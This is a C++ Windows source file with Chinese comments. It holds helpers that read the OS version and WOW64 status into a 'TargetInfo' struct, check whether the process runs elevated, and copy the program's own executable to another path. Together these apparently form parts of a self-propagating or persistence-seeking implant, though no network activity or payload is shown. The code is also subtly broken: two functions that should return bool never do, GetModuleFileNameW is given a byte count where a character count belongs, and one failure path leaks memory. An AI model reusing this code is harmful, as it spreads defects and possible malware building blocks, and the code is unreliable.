#include"include.h"

bool check_target_info(TargetInfo &targetInfo)
{
	typedef LONG(__stdcall* fnRtlGetVersionEx)(LPOSVERSIONINFOEXA lpVersionInformation);
	fnRtlGetVersionEx pRtlGetVersion;
	HMODULE hNtdll;
	LONG ntStatus;
	OSVERSIONINFOEXA VersionInformation = { 0 };

	hNtdll = GetModuleHandle(L"ntdll.dll");
	if (hNtdll == NULL) return false;
	pRtlGetVersion = (fnRtlGetVersionEx)GetProcAddress(hNtdll, "RtlGetVersion");
	if (pRtlGetVersion == NULL) return false;
	VersionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
	ntStatus = pRtlGetVersion(&VersionInformation);
	if (ntStatus != 0) return false;

	targetInfo.dwMajorVersion = VersionInformation.dwMajorVersion;
	targetInfo.dwMinorVersion = VersionInformation.dwMinorVersion;

	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

	LPFN_ISWOW64PROCESS
		fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
			GetModuleHandle(L"kernel32.dll"), "IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &targetInfo.bIsWow64))
		{
			return false;
		}
	}

    //https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-osversioninfoexa
}

bool check_admin()
{
	BOOL bElevated = FALSE;	//是否管理员
	//1.得到自身进程的权限访问令牌
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		return FALSE;
	//2.获取进程相关运行权限
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) 	
	{
		//如果接受到的内存大小和结构体成正比例，代表接受完整的进程权限数据
		if (dwRetLen == sizeof(tokenEle)) 	
		{ 
			//取是否管理员布尔值
			bElevated = tokenEle.TokenIsElevated; 
		}
	}   	
	//关闭进程令牌
	CloseHandle(hToken);  	
	//返回是否OK
	return bElevated;
}

bool copy_self(wchar_t* dst)
{
	wchar_t path[MAX_PATH] = { 0 };
	GetModuleFileNameW(0, path, sizeof(path));
	HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING,
		FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	DWORD dwSize = GetFileSize(hFile, NULL);
	char *ptr = (char*)malloc(dwSize);
	DWORD bytes_read = 0;
	ReadFile(hFile, ptr, dwSize, &bytes_read, NULL);
	CloseHandle(hFile);
	if (dwSize != bytes_read)
	{
		free(ptr);
		return false;
	}
	hFile = CreateFile(dst, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, CREATE_ALWAYS,
		FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	WriteFile(hFile, ptr, dwSize, &bytes_read, NULL);
	CloseHandle(hFile);
	free(ptr);
}